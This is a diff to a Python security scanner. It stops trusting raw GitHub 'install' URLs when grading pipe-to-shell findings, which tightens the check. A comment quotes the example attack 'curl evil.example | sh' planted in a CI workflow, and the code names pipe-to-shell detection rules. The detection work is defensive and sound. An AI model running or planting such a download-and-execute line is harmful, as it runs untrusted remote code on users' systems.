@@ -91,9 +91,9 @@ def prose_cap(finding: Finding) -> Optional[str]:
 # where a malicious download-and-execute one-liner would be planted (``curl evil.example | sh`` in a
 # ``.github/workflows`` step stays ``high``). The documented, non-attack shape is a pipe whose URL is a
 # NAMED trusted installer: Hermes' own ``install.sh``, a named upstream runtime (``ollama.com``,
-# ``bun.sh``, ``get.docker.com``, ``sh.rustup.rs`` …), a named dev-tool CLI (``app.factory.ai``), or a
-# GitHub ``raw`` URL whose path is an ``install`` script. That lands at medium (a note). An unpinned /
-# unknown third-party domain — the attack shape — keeps full severity, in README, code, OR CI.
+# ``bun.sh``, ``get.docker.com``, ``sh.rustup.rs`` …), or a named dev-tool CLI
+# (``app.factory.ai``). That lands at medium (a note). An unpinned or user-controlled
+# third-party host — including raw GitHub content — keeps full severity in README, code, or CI.
 _PIPE_TO_SHELL_IDS = {"curl_pipe_shell", "wget_pipe_shell", "curl_pipe_python"}
 _URL_IN_LINE = re.compile(r'https?://([^\s/"\'`)]+)([^\s"\'`)]*)')
 _TRUSTED_INSTALLER_HOSTS = {
@@ -103,12 +103,8 @@ _TRUSTED_INSTALLER_HOSTS = {
 
 
 def _is_trusted_installer_url(host: str, path: str) -> bool:
-    host = host.lower()
-    if host in _TRUSTED_INSTALLER_HOSTS:
-        return True
-    # A GitHub raw URL is user-controlled, so only an ``install``-named script path qualifies
-    # (``.../scripts/install.sh``, ``.../install-plugin.sh``), never an arbitrary payload.
-    return host == "raw.githubusercontent.com" and "install" in path.lower()
+    del path
+    return host.lower() in _TRUSTED_INSTALLER_HOSTS
 
 
 def is_trusted_installer_pipe(finding: Finding, line: str) -> bool:
